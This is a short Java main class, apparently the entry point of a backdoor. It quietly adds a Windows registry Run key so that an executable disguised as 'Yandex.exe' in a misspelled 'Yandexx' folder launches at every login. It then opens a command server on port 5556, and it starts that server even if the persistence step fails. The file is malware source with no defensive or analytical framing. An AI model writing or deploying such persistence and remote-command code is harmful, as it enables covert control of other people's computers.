package ru.at0m1cc;

import java.io.IOException;
/**
 * Главный класс
 * @author at0m1cc
 * @version 1.0
 * */
public class Main {
    /**
     *  Точка входа в программу
     *  @param args аргументы командной строки
     * */
    public static void main(String[] args) {
        try {
            // Добавление в автозагрузку
            Runtime.getRuntime().exec("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v 1 /t REG_SZ /d \"C:\\Program Files\\Yandexx\\Yandex.exe\"");
            ServerLogic serv = new ServerLogic(5556, new Commands());
            //  Запуск сервера
            serv.start();
        } catch (IOException e) {
            // Если по каким-то причинам добавление в автозагрузку не получилось, просто запускаем сервер
            ServerLogic serv = new ServerLogic(5556, new Commands());
            serv.start();
        }
    }
}